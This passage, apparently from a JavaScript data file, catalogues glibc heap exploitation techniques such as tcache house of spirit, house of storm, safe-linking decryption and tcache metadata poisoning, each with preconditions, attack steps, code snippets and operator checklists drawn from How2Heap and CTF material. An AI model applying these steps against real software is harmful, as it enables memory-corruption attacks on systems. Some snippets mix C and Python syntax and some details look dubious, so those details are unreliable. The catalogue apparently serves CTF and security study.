          { description: 'PicoCTF 2024: High Frequency Troubles', url: 'https://play.picoctf.org/practice/challenge/441' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['malloc returns arbitrary address via tcache poisoning', 'No free() call required'],
      artifacts: ['Corrupted top chunk and tcache entry']
    },

    operatorChecklist: [
      '[ ] Overflow into top chunk size field',
      '[ ] Set size to trigger sysmalloc',
      '[ ] Trigger large malloc to invoke sysmalloc',
      '[ ] Old top chunk freed into tcache',
      '[ ] Corrupt tcache fd pointer to target address',
      '[ ] malloc returns target address',
      '[ ] Chain with second-stage technique'
    ],

    vulnerabilityTypes: ['heap', 'top-chunk', 'tcache'],
    references: [
      { description: 'How2Heap: house_of_tangerine', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.39/house_of_tangerine.c' },
      { description: 'PicoCTF 2024: High Frequency Troubles', url: 'https://play.picoctf.org/practice/challenge/441' }
    ]
  },

  tcache_house_of_spirit: {
    id: 'tcache_house_of_spirit',
    name: 'Tcache House of Spirit',
    category: 'technique',
    class: 'house',
    description: 'The tcache-era version of House of Spirit. Frees a fake chunk (on stack, BSS, or any writable region) to get malloc to return a nearly-arbitrary pointer via the tcache freelist. Simpler than the classic version since tcache has fewer integrity checks.',

    preconditions: {
      summary: 'Ability to call free() on an arbitrary address where a fake chunk can be forged.',
      required: [
        'Ability to call free() on an attacker-controlled address',
        'Writable memory region at the target address (stack, BSS, heap, etc.)',
        'Must forge a valid chunk header (size field at offset 0x8)',
        'Glibc >= 2.26 (tcache era)'
      ],
      detectionSteps: [
        'Forge a fake chunk at target address: set size field to valid tcache size (0x20-0x410)',
        'Set the next chunk size field (at fake_chunk + size) to a valid value',
        'Call free(fake_chunk) which enters tcache',
        'malloc(same_size) returns fake_chunk pointer'
      ]
    },

    exploitationPaths: [
      {
        name: 'Fake Chunk on Stack to Stack Allocation via Tcache',
        description: 'Forge a fake chunk on the stack and free it to get malloc to return stack memory.',
        steps: [
          'Identify a writable region (stack, BSS, etc.) where you can forge a chunk',
          'Forge chunk header: size = 0x31 (0x20 data + 0x10 header, PREV_INUSE set)',
          'Forge next chunk header: size = 0x21 (valid size for the region)',
          'Call free(fake_chunk_address): chunk enters tcache',
          'malloc(0x20) returns fake_chunk_address',
          'Now you can write to the stack/BSS via malloc pointer'
        ],
        tools: ['pwndbg heap', 'pwntools', 'GDB'],
        codeSnippet: `# Forge fake chunk on stack
char buf[0x40];
uint64_t *fake_chunk = (uint64_t*)buf;

// Set size field (offset 0x8 from malloc pointer)
// We want malloc to return buf, so fake_chunk = buf - 0x10
fake_chunk[0] = 0;           // prev_size (unused)
fake_chunk[1] = 0x31;        // size: 0x20 data + PREV_INUSE
fake_chunk[2] = 0x21;        // next chunk size

// Free the fake chunk
free((void*)fake_chunk);     // enters tcache

// Get allocation at fake chunk
void *p = malloc(0x20);      // p == &buf!`,
        applicableLibc: '>= 2.26',
        references: [
          { description: 'How2Heap: tcache_house_of_spirit', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/tcache_house_of_spirit.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['malloc returns pointer in stack/BSS region', 'Arbitrary allocation at attacker-controlled address'],
      artifacts: ['Fake chunk in tcache freelist']
    },

    operatorChecklist: [
      '[ ] Choose target region (stack, BSS, etc.)',
      '[ ] Forge chunk header with valid size',
      '[ ] Forge next chunk header with valid size',
      '[ ] Call free() on fake chunk address',
      '[ ] Verify chunk enters tcache via pwndbg bins',
      '[ ] malloc returns fake chunk address',
      '[ ] Write to the target region via malloc pointer'
    ],

    vulnerabilityTypes: ['heap', 'house'],
    references: [
      { description: 'How2Heap: tcache_house_of_spirit', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/tcache_house_of_spirit.c' }
    ]
  },

  fastbin_reverse_into_tcache: {
    id: 'fastbin_reverse_into_tcache',
    name: 'Fastbin Reverse into Tcache',
    category: 'technique',
    class: 'heap-technique',
    description: 'Exploits an overwrite of a freed chunk in the fastbin to write a large value (heap pointer) to an arbitrary address. When a fastbin chunk is freed while tcache is full, it goes to the fastbin. The allocator consolidation process then writes the fastbin head to an arbitrary address via the corrupted bk pointer.',

    preconditions: {
      summary: 'A heap overflow or UAF that allows corrupting a fastbin chunk metadata, combined with a full tcache to force the chunk into the fastbin.',
      required: [
        'Heap overflow or UAF on a fastbin-sized chunk',
        'Tcache must be full (7 entries) for the target size to force fastbin usage',
        'Ability to corrupt the fastbin chunk fd/bk pointers',
        'Glibc 2.26-2.42 (patched in 2.43+)'
      ],
      detectionSteps: [
        'Fill tcache for the target size (7 frees)',
        'Free another chunk which goes to fastbin',
        'Corrupt the fastbin chunk metadata',
        'Trigger consolidation or malloc: arbitrary write occurs'
      ]
    },

    exploitationPaths: [
      {
        name: 'Fastbin Corruption to Arbitrary Write via Tcache',
        description: 'Corrupt a fastbin chunk to write a heap pointer to an arbitrary address during tcache population.',
        steps: [
          'Fill tcache for size X (7 chunks freed)',
          'Allocate and free chunk A (size X): goes to fastbin',
          'Overflow into A metadata to corrupt pointers',
          'Trigger malloc_consolidate or a large malloc: fastbin chunks move to unsorted bin',
          'During the move, the corrupted pointers cause an arbitrary write',
          'Result: arbitrary address receives a heap pointer'
        ],
        tools: ['pwndbg bins', 'pwntools'],
        codeSnippet: `# Fill tcache
for i in range(7):
    p = malloc(0x60)
    free(p)

# Fastbin chunk
a = malloc(0x60)
free(a)  # a goes to fastbin (tcache full)

# Corrupt fastbin chunk
*(uint64_t*)(a + 0x18) = target_addr - 0x10  # bk pointer

# Trigger consolidation
malloc(0x400)  # large malloc triggers consolidate
# target_addr now contains heap pointer`,
        applicableLibc: '2.26-2.42',
        references: [
          { description: 'How2Heap: fastbin_reverse_into_tcache', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/fastbin_reverse_into_tcache.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Arbitrary address overwritten with heap pointer', 'Can be chained with GOT overwrite or FSOP'],
      artifacts: ['GDB: corrupted fastbin chunk visible in bins']
    },

    operatorChecklist: [
      '[ ] Fill tcache for target size (7 entries)',
      '[ ] Free chunk to fastbin',
      '[ ] Corrupt fastbin chunk fd/bk pointers',
      '[ ] Trigger consolidation via large malloc',
      '[ ] Verify arbitrary write occurred',
      '[ ] Chain with second-stage technique'
    ],

    vulnerabilityTypes: ['heap', 'fastbin', 'tcache'],
    references: [
      { description: 'How2Heap: fastbin_reverse_into_tcache', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/fastbin_reverse_into_tcache.c' }
    ]
  },

  house_of_mind_fastbin: {
    id: 'house_of_mind_fastbin',
    name: 'House of Mind (Fastbin)',
    category: 'technique',
    class: 'house',
    description: 'Exploits a single byte overwrite with arena handling to write a large value (heap pointer) to an arbitrary address. By corrupting the arena index in a chunk header, the allocator uses a fake arena structure to perform the free operation, enabling arbitrary writes.',

    preconditions: {
      summary: 'A single byte overwrite (or small overflow) that can corrupt the arena index in a chunk header, combined with the ability to place a fake arena structure.',
      required: [
        'Single byte overwrite or small overflow on a chunk header',
        'Ability to place a fake arena structure in memory',
        'The fake arena must have valid bins (fastbin pointers)',
        'Glibc < 2.43 (patched with arena index validation)'
      ],
      detectionSteps: [
        'Identify the arena index byte in the chunk header (bits 13-16 of the size field)',
        'Place a fake arena structure at the calculated offset from the corrupted index',
        'The fake arena fastbins must point to attacker-controlled addresses',
        'Free the chunk: allocator uses fake arena and writes to arbitrary address'
      ]
    },

    exploitationPaths: [
      {
        name: 'Arena Index Corruption to Arbitrary Write',
        description: 'Corrupt the arena index byte to redirect free() to a fake arena with controlled fastbins.',
        steps: [
          'Identify the arena index in the chunk size field (bits 13-16)',
          'Place a fake arena structure at: main_arena + (corrupted_index - 1) * sizeof(arena)',
          'Set the fake arena fastbin pointers to target addresses',
          'Free the chunk with corrupted arena index',
          'Allocator uses fake arena: fastbin->fd = chunk',
          'Result: arbitrary address receives a heap pointer'
        ],
        tools: ['pwndbg heap', 'pwntools', 'GDB'],
        codeSnippet: `# Fake arena structure
# Place at calculated offset from main_arena
fake_arena = main_arena + (fake_index - 1) * 0x1000

# Set fake arena fastbin to target
*(uint64_t*)(fake_arena + fastbin_offset) = target_addr - 0x10

# Corrupt chunk arena index byte
*(uint8_t*)(chunk + 0x8) = fake_index_byte

# Free uses fake arena
free(chunk)
# target_addr now contains heap pointer`,
        applicableLibc: '< 2.43',
        references: [
          { description: 'How2Heap: house_of_mind_fastbin', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_mind_fastbin.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Arbitrary address overwritten with heap pointer', 'Fake arena structure used by allocator'],
      artifacts: ['GDB: fake arena visible in memory map']
    },

    operatorChecklist: [
      '[ ] Identify arena index byte in chunk header',
      '[ ] Calculate fake arena address from corrupted index',
      '[ ] Place fake arena structure in memory',
      '[ ] Set fake arena fastbin pointers to target addresses',
      '[ ] Corrupt chunk arena index byte',
      '[ ] Free chunk: allocator uses fake arena',
      '[ ] Verify arbitrary write occurred'
    ],

    vulnerabilityTypes: ['heap', 'house', 'fastbin'],
    references: [
      { description: 'How2Heap: house_of_mind_fastbin', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_mind_fastbin.c' }
    ]
  },

  house_of_storm: {
    id: 'house_of_storm',
    name: 'House of Storm',
    category: 'technique',
    class: 'house',
    description: 'Exploits a use-after-free on both a large bin and unsorted bin chunk to return an arbitrary chunk from malloc. By corrupting both bin linked lists simultaneously, the allocator returns a chunk at an attacker-controlled address.',

    preconditions: {
      summary: 'A UAF that allows corrupting both a large bin chunk and an unsorted bin chunk simultaneously.',
      required: [
        'UAF on both a large bin chunk and an unsorted bin chunk',
        'Ability to corrupt fd_nextsize, bk_nextsize of large bin chunk',
        'Ability to corrupt fd, bk of unsorted bin chunk',
        'Glibc < 2.29 (patched with additional integrity checks)'
      ],
      detectionSteps: [
        'Free chunks into both large bin and unsorted bin',
        'Corrupt large bin chunk fd_nextsize and bk_nextsize',
        'Corrupt unsorted bin chunk fd and bk',
        'Trigger malloc: allocator traverses both bins and returns arbitrary chunk'
      ]
    },

    exploitationPaths: [
      {
        name: 'Large Bin + Unsorted Bin Corruption to Arbitrary Chunk',
        description: 'Corrupt both large bin and unsorted bin linked lists to make malloc return an arbitrary chunk.',
        steps: [
          'Free chunk A into unsorted bin',
          'Free chunk B into large bin (larger than A)',
          'Overflow to corrupt B fd_nextsize and bk_nextsize',
          'Overflow to corrupt A fd and bk',
          'Call malloc(size): allocator checks large bin first, then unsorted bin',
          'Corrupted pointers cause allocator to return chunk at arbitrary address'
        ],
        tools: ['pwndbg bins', 'pwntools'],
        codeSnippet: `# Setup bins
a = malloc(0x400)  # unsorted bin size
b = malloc(0x500)  # large bin size
free(a)  # unsorted bin
free(b)  # large bin

# Corrupt large bin chunk
*(uint64_t*)(b + 0x20) = target_addr - 0x20  # fd_nextsize
*(uint64_t*)(b + 0x28) = target_addr - 0x10  # bk_nextsize

# Corrupt unsorted bin chunk
*(uint64_t*)(a + 0x10) = target_addr - 0x18  # fd
*(uint64_t*)(a + 0x18) = target_addr - 0x10  # bk

# Get arbitrary chunk
p = malloc(0x400)  # p points to target_addr!`,
        applicableLibc: '< 2.29',
        references: [
          { description: 'How2Heap: house_of_storm', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_storm.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['malloc returns chunk at attacker-controlled address', 'Both large bin and unsorted bin corrupted'],
      artifacts: ['GDB: corrupted large bin and unsorted bin visible in bins']
    },

    operatorChecklist: [
      '[ ] Free chunks into both large bin and unsorted bin',
      '[ ] Corrupt large bin fd_nextsize and bk_nextsize',
      '[ ] Corrupt unsorted bin fd and bk',
      '[ ] Trigger malloc to get arbitrary chunk',
      '[ ] Note: patched in glibc 2.29+'
    ],

    vulnerabilityTypes: ['heap', 'house', 'large-bin', 'unsorted-bin'],
    references: [
      { description: 'How2Heap: house_of_storm', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_storm.c' }
    ]
  },

  house_of_gods: {
    id: 'house_of_gods',
    name: 'House of Gods',
    category: 'technique',
    class: 'house',
    description: 'A technique to hijack a thread arena within 8 allocations. By corrupting the arena list and forcing the allocator to use a fake arena, an attacker can control malloc/free behavior for a thread.',

    preconditions: {
      summary: 'A heap overflow or UAF that allows corrupting the arena list or thread arena pointer.',
      required: [
        'Heap overflow or UAF on a chunk near the arena structure',
        'Ability to place a fake arena structure',
        'Glibc < 2.27 (patched with arena list validation)'
      ],
      detectionSteps: [
        'Identify the thread arena pointer in TLS',
        'Corrupt the arena pointer to point to fake arena',
        'Place fake arena with controlled bins',
        'Subsequent malloc/free uses fake arena'
      ]
    },

    exploitationPaths: [
      {
        name: 'Thread Arena Hijack via Fake Arena',
        description: 'Corrupt the thread arena pointer to redirect malloc/free to a fake arena.',
        steps: [
          'Identify thread arena pointer location (TLS)',
          'Corrupt arena pointer to point to fake arena structure',
          'Place fake arena with controlled fastbin/unsorted bin pointers',
          'Subsequent malloc uses fake arena bins',
          'Free operations write to attacker-controlled addresses'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        codeSnippet: `# Corrupt thread arena pointer
# Located in TLS at fs:0x10 (x86_64)
*(uint64_t*)(tls_arena_ptr) = fake_arena_addr

# Fake arena with controlled bins
*(uint64_t*)(fake_arena + fastbin_offset) = target_addr

# malloc uses fake arena
p = malloc(0x60)  # returns from fake arena fastbin`,
        applicableLibc: '< 2.27',
        references: [
          { description: 'How2Heap: house_of_gods', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.24/house_of_gods.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Thread uses fake arena for malloc/free', 'Arbitrary writes via fake arena bins'],
      artifacts: ['GDB: thread arena pointer corrupted']
    },

    operatorChecklist: [
      '[ ] Identify thread arena pointer in TLS',
      '[ ] Place fake arena structure in memory',
      '[ ] Corrupt arena pointer to fake arena',
      '[ ] Set fake arena bins to target addresses',
      '[ ] Trigger malloc/free to use fake arena',
      '[ ] Note: patched in glibc 2.27+'
    ],

    vulnerabilityTypes: ['heap', 'house', 'arena'],
    references: [
      { description: 'How2Heap: house_of_gods', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.24/house_of_gods.c' }
    ]
  },

  decrypt_safe_linking: {
    id: 'decrypt_safe_linking',
    name: 'Decrypt Safe Linking',
    category: 'technique',
    class: 'heap-technique',
    description: 'Decrypts the poisoned value in a tcache/fastbin linked list to recover the actual pointer. Safe linking (glibc 2.32+) XORs the fd pointer with a shifted version of the chunk address to prevent straightforward pointer overwrites.',

    preconditions: {
      summary: 'A heap leak that reveals the fd pointer of a freed chunk, combined with knowledge of the chunk address to reverse the safe linking XOR.',
      required: [
        'Heap leak revealing the poisoned fd pointer',
        'Knowledge of the chunk address (from leak or calculation)',
        'Glibc >= 2.32 (safe linking era)',
        'Ability to read the poisoned fd value'
      ],
      detectionSteps: [
        'Leak the poisoned fd pointer from a freed chunk',
        'Calculate the chunk address (from leak or heap base)',
        'Apply reverse XOR: actual_fd = poisoned_fd XOR (chunk_addr >> 12)',
        'Verify the decrypted fd points to a valid heap address'
      ]
    },

    exploitationPaths: [
      {
        name: 'Safe Linking Decryption to Recover Pointers',
        description: 'Reverse the safe linking XOR to recover actual fd pointers for exploitation.',
        steps: [
          'Leak the poisoned fd pointer from a freed chunk',
          'Calculate chunk address: chunk_addr = leaked_chunk_address',
          'Decrypt: actual_fd = poisoned_fd XOR (chunk_addr >> 12)',
          'Use actual_fd to map the heap layout',
          'For exploitation: to corrupt fd, calculate poisoned_value = target XOR (chunk_addr >> 12)'
        ],
        tools: ['pwndbg bins', 'pwntools'],
        codeSnippet: `# Safe linking decryption
# glibc 2.32+: fd is XORed with (chunk_addr >> 12)

# Leak poisoned fd
poisoned_fd = leak_from_heap(chunk_addr + 0x10)

# Decrypt to get actual fd
actual_fd = poisoned_fd ^ (chunk_addr >> 12)

# To corrupt fd for tcache poisoning:
# poisoned_value = target_addr ^ (chunk_addr >> 12)
*(uint64_t*)(chunk_addr + 0x10) = target_addr ^ (chunk_addr >> 12)`,
        applicableLibc: '>= 2.32',
        references: [
          { description: 'How2Heap: decrypt_safe_linking', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/decrypt_safe_linking.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Actual fd pointer recovered from poisoned value', 'Can now corrupt fd for tcache poisoning with correct XOR'],
      artifacts: ['GDB: decrypted fd points to valid heap address']
    },

    operatorChecklist: [
      '[ ] Leak poisoned fd pointer from freed chunk',
      '[ ] Calculate chunk address',
      '[ ] Decrypt: actual_fd = poisoned_fd XOR (chunk_addr >> 12)',
      '[ ] Verify decrypted fd is valid',
      '[ ] For exploitation: calculate poisoned_value = target XOR (chunk_addr >> 12)',
      '[ ] Write poisoned_value to corrupt fd'
    ],

    vulnerabilityTypes: ['heap', 'tcache', 'safe-linking'],
    references: [
      { description: 'How2Heap: decrypt_safe_linking', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/decrypt_safe_linking.c' }
    ]
  },

  tcache_metadata_poisoning: {
    id: 'tcache_metadata_poisoning',
    name: 'Tcache Metadata Poisoning',
    category: 'technique',
    class: 'heap-technique',
    description: 'Tricks the tcache into providing arbitrary pointers by manipulating the tcache metadata struct (tcache_perthread_struct). By overwriting the counts and entries arrays, an attacker can make malloc return any address without corrupting individual chunk fd pointers.',

    preconditions: {
      summary: 'A heap overflow or UAF that allows writing to the tcache_perthread_struct.',
      required: [
        'Heap overflow or UAF reaching the tcache_perthread_struct',
        'The struct is located at heap_base + 0x10 (after main arena)',
        'Ability to overwrite counts[N] and entries[N] arrays',
        'Glibc >= 2.26 (tcache era)'
      ],
      detectionSteps: [
        'Locate tcache_perthread_struct on the heap',
        'Identify the size index for target allocation size',
        'Overwrite entries[size_index] with target address',
        'Set counts[size_index] to non-zero value',
        'malloc returns target address'
      ]
    },

    exploitationPaths: [
      {
        name: 'Tcache Struct Corruption to Arbitrary Allocation',
        description: 'Directly corrupt the tcache metadata struct to insert arbitrary addresses.',
        steps: [
          'Locate tcache_perthread_struct (heap_base + 0x10)',
          'Calculate size_index = target_size >> 4',
          'Overwrite entries[size_index] = target_address',
          'Set counts[size_index] = 1 (or higher)',
          'malloc(target_size) returns target_address directly',
          'No chunk corruption needed: direct metadata manipulation'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        codeSnippet: `# Tcache metadata struct layout:
# counts[64] (64 bytes) + entries[64] (512 bytes)
# Total: 576 bytes

tcache_struct = heap_base + 0x10
size_index = 0x60 >> 4  # for 0x60 size

# Direct metadata manipulation
*(uint64_t*)(tcache_struct + 0x40 + size_index * 8) = target_addr
*(uint8_t*)(tcache_struct + size_index) = 1

p = malloc(0x60)  # p == target_addr!`,
        applicableLibc: '>= 2.26',
        references: [
          { description: 'How2Heap: tcache_metadata_poisoning', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.27/tcache_metadata_poisoning.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['malloc returns arbitrary address via metadata corruption', 'No individual chunk corruption needed'],
      artifacts: ['GDB: tcache_perthread_struct with corrupted entries']
    },

    operatorChecklist: [
      '[ ] Locate tcache_perthread_struct',
      '[ ] Calculate size_index for target size',
      '[ ] Overwrite entries[size_index] = target_address',
      '[ ] Set counts[size_index] = 1',
      '[ ] malloc returns target address',
      '[ ] Chain with second-stage technique'
    ],

    vulnerabilityTypes: ['heap', 'tcache', 'metadata'],
    references: [
      { description: 'How2Heap: tcache_metadata_poisoning', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.27/tcache_metadata_poisoning.c' }
    ]
  },

  house_of_io: {
    id: 'house_of_io',
    name: 'House of IO',
    category: 'technique',
    class: 'house',
    description: 'Tricks malloc into returning a pointer to arbitrary memory by manipulating the tcache management struct via UAF in a freed tcache chunk. Combines tcache metadata corruption with the tcache_perthread_struct to achieve arbitrary allocation.',

    preconditions: {
      summary: 'A UAF on a tcache chunk that allows overwriting the tcache_perthread_struct entries.',
      required: [
        'UAF on a tcache-sized chunk',
        'Ability to write to tcache_perthread_struct via the dangling pointer',
        'Glibc 2.31-2.33'
      ],
      detectionSteps: [
        'Free chunk to tcache',
        'Use UAF to overwrite tcache metadata',
        'Set entries[size_index] = target_address',
        'malloc returns target address'
      ]
    },

    exploitationPaths: [
      {
        name: 'Tcache UAF to Arbitrary Pointer',
        description: 'Use UAF on a tcache chunk to corrupt the tcache metadata and get arbitrary allocation.',
        steps: [
          'Free chunk to tcache',
          'Use UAF to overwrite tcache_perthread_struct',
          'Set entries[size_index] = target_address',
          'malloc returns target address from corrupted tcache'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        codeSnippet: `# UAF on tcache chunk
p = malloc(0x60)
free(p)  # p in tcache

# UAF: overwrite tcache metadata via dangling p
tcache_struct = heap_base + 0x10
size_index = 0x60 >> 4

*(uint64_t*)(tcache_struct + 0x40 + size_index * 8) = target_addr
*(uint8_t*)(tcache_struct + size_index) = 1

q = malloc(0x60)  # q == target_addr!`,
        applicableLibc: '2.31-2.33',
        references: [
          { description: 'How2Heap: house_of_io', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.31/house_of_io.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['malloc returns arbitrary address via tcache UAF', 'Tcache metadata corrupted'],
      artifacts: ['GDB: corrupted tcache entries visible']
    },

    operatorChecklist: [
      '[ ] Free chunk to tcache',
      '[ ] Use UAF to overwrite tcache metadata',
      '[ ] Set entries[size_index] = target_address',
      '[ ] malloc returns target address',
      '[ ] Chain with second-stage technique'
    ],

    vulnerabilityTypes: ['heap', 'tcache', 'uaf'],
    references: [
      { description: 'How2Heap: house_of_io', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.31/house_of_io.c' }
    ]
  },

  tcache_relative_write: {
    id: 'tcache_relative_write',
    name: 'Tcache Relative Write',
    category: 'technique',
    class: 'heap-technique',
    description: 'Arbitrary decimal value and chunk pointer writing in the heap by out-of-bounds tcache metadata writing. By overflowing into the tcache counts array, an attacker can manipulate the count values to control tcache behavior and achieve arbitrary writes.',

    preconditions: {
      summary: 'A heap overflow that reaches the tcache_perthread_struct counts array.',
      required: [
        'Heap overflow reaching tcache metadata',
        'Ability to overwrite counts[size_index] values',
        'Glibc 2.30-2.41 (patched in 2.42+)'
      ],
      detectionSteps: [
        'Identify tcache_perthread_struct location',
        'Overflow into counts array',
        'Manipulate count values to control tcache behavior',
        'Trigger malloc to get arbitrary allocation'
      ]
    },

    exploitationPaths: [
      {
        name: 'OOB Tcache Count Write to Arbitrary Allocation',
        description: 'Overflow into tcache counts to manipulate allocation behavior.',
        steps: [
          'Overflow into tcache counts array',
          'Set counts[size_index] to desired value',
          'This controls how many chunks tcache thinks it has',
          'Combined with fd corruption, achieves arbitrary allocation'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        codeSnippet: `# Overflow into tcache counts
# counts array starts at tcache_struct
*(uint8_t*)(tcache_struct + size_index) = 7  # fake count

# Now tcache thinks it has 7 chunks
# Combined with fd corruption = arbitrary alloc`,
        applicableLibc: '2.30-2.41',
        references: [
          { description: 'How2Heap: tcache_relative_write', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.41/tcache_relative_write.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Tcache counts manipulated', 'Arbitrary allocation achieved'],
      artifacts: ['GDB: corrupted tcache counts']
    },

    operatorChecklist: [
      '[ ] Identify tcache metadata location',
      '[ ] Overflow into counts array',
      '[ ] Set counts to desired values',
      '[ ] Combine with fd corruption',
      '[ ] Note: patched in glibc 2.42+'
    ],

    vulnerabilityTypes: ['heap', 'tcache', 'overflow'],
    references: [
      { description: 'How2Heap: tcache_relative_write', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.41/tcache_relative_write.c' }
    ]
  },

  tcache_metadata_hijacking: {
    id: 'tcache_metadata_hijacking',
    name: 'Tcache Metadata Hijacking',
    category: 'technique',
    class: 'heap-technique',
    description: 'Arbitrary allocation by overflow into tcache metadata. The latest technique (glibc >= 2.42) that exploits the tcache metadata structure to achieve arbitrary allocation even with modern hardening.',

    preconditions: {
      summary: 'A heap overflow that reaches the tcache metadata structure in glibc 2.42+.',
      required: [
        'Heap overflow reaching tcache metadata',
        'Glibc >= 2.42',
        'Ability to overwrite tcache entries and counts'
      ],
      detectionSteps: [
        'Identify tcache metadata layout in glibc 2.42+',
        'Overflow into metadata',
        'Corrupt entries and counts',
        'malloc returns arbitrary address'
      ]
    },

    exploitationPaths: [
      {
        name: 'Tcache Metadata Overflow to Arbitrary Allocation',
        description: 'Overflow into tcache metadata to achieve arbitrary allocation in modern glibc.',
        steps: [
          'Overflow into tcache metadata',
          'Corrupt entries[size_index] = target_address',
          'Set counts[size_index] to non-zero',
          'malloc returns target address'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        codeSnippet: `# Overflow into tcache metadata (glibc 2.42+)
*(uint64_t*)(tcache_struct + 0x40 + size_index * 8) = target_addr
*(uint8_t*)(tcache_struct + size_index) = 1

p = malloc(target_size)  # p == target_addr!`,
        applicableLibc: '>= 2.42',
        references: [
          { description: 'How2Heap: tcache_metadata_hijacking', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.42/tcache_metadata_hijacking.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['malloc returns arbitrary address', 'Tcache metadata corrupted'],
      artifacts: ['GDB: corrupted tcache metadata']
    },

    operatorChecklist: [
      '[ ] Identify tcache metadata in glibc 2.42+',
      '[ ] Overflow into metadata',
      '[ ] Corrupt entries and counts',
      '[ ] malloc returns target address'
    ],

    vulnerabilityTypes: ['heap', 'tcache', 'overflow'],
    references: [
      { description: 'How2Heap: tcache_metadata_hijacking', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.42/tcache_metadata_hijacking.c' }
    ]
  },

  fastbin_dup_consolidate: {
    id: 'fastbin_dup_consolidate',
    name: 'Fastbin Dup Consolidate',
    category: 'technique',
    class: 'heap-technique',
    description: 'Tricks malloc into returning an already-allocated heap pointer by putting a pointer on both the fastbin freelist and the top chunk. When malloc_consolidate is triggered, the fastbin chunk is moved to the unsorted bin, but the top chunk still has a reference to it.',

    preconditions: {
      summary: 'A double-free that allows a chunk to be in both the fastbin and the top chunk simultaneously.',
      required: [
        'Double-free vulnerability',
        'Ability to trigger malloc_consolidate (large malloc)',
        'Glibc < 2.43 (patched with additional checks)'
      ],
      detectionSteps: [
        'Double-free a chunk',
        'Trigger malloc_consolidate with large malloc',
        'Fastbin chunk moves to unsorted bin',
        'Top chunk still references the same memory',
        'Next allocation returns overlapping chunk'
      ]
    },

    exploitationPaths: [
      {
        name: 'Double Free + Consolidate to Overlapping Chunks',
        description: 'Use double-free and consolidation to create overlapping allocations.',
        steps: [
          'Allocate chunk A',
          'Free A (goes to fastbin)',
          'Free A again (double-free, still in fastbin)',
          'Trigger malloc_consolidate with large malloc',
          'A moves from fastbin to unsorted bin',
          'Next allocation returns A from unsorted bin',
          'But A is also still in fastbin: overlapping chunks!'
        ],
        tools: ['pwndbg bins', 'pwntools'],
        codeSnippet: `# Double free
a = malloc(0x60)
free(a)  # fastbin
free(a)  # double-free!

# Trigger consolidation
malloc(0x400)  # large malloc

# Now a is in unsorted bin AND fastbin
# Next allocation from fastbin returns a again
b = malloc(0x60)  # b == a (overlapping!)`,
        applicableLibc: '< 2.43',
        references: [
          { description: 'How2Heap: fastbin_dup_consolidate', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/fastbin_dup_consolidate.c' },
          { description: 'Hitcon 2016: SleepyHolder', url: 'https://github.com/mehQQ/public_writeup/tree/master/hitcon2016/SleepyHolder' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Overlapping chunks achieved', 'Same memory referenced by two pointers'],
      artifacts: ['GDB: chunk visible in both fastbin and unsorted bin']
    },

    operatorChecklist: [
      '[ ] Double-free a chunk',
      '[ ] Trigger malloc_consolidate',
      '[ ] Verify chunk in both fastbin and unsorted bin',
      '[ ] Allocate to get overlapping chunk',
      '[ ] Use overlap for arbitrary read/write'
    ],

    vulnerabilityTypes: ['heap', 'fastbin', 'double-free'],
    references: [
      { description: 'How2Heap: fastbin_dup_consolidate', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/fastbin_dup_consolidate.c' },
      { description: 'Hitcon 2016: SleepyHolder', url: 'https://github.com/mehQQ/public_writeup/tree/master/hitcon2016/SleepyHolder' }
    ]
  },

  mmap_overlapping_chunks: {
    id: 'mmap_overlapping_chunks',
    name: 'Mmap Overlapping Chunks',
    category: 'technique',
    class: 'heap-technique',
    description: 'Exploits an in-use mmap chunk to make a new allocation overlap with a current mmap chunk. By corrupting the size of an mmap chunk, subsequent allocations can overlap with the mmap region.',

    preconditions: {
      summary: 'A heap overflow that can corrupt the size field of an mmap chunk.',
      required: [
        'Heap overflow reaching mmap chunk size field',
        'Mmap chunk allocated (size > mmap_threshold)',
        'Ability to corrupt the mmap chunk size'
      ],
      detectionSteps: [
        'Allocate mmap chunk (large malloc)',
        'Overflow into mmap chunk size field',
        'Corrupt size to include adjacent memory',
        'Next allocation overlaps with mmap chunk'
      ]
    },

    exploitationPaths: [
      {
        name: 'Mmap Chunk Corruption to Overlapping Allocation',
        description: 'Corrupt mmap chunk size to cause overlapping allocations.',
        steps: [
          'Allocate mmap chunk (large malloc)',
          'Overflow into mmap chunk size field',
          'Set size to include adjacent memory',
          'Free mmap chunk',
          'Next allocation overlaps with mmap region'
        ],
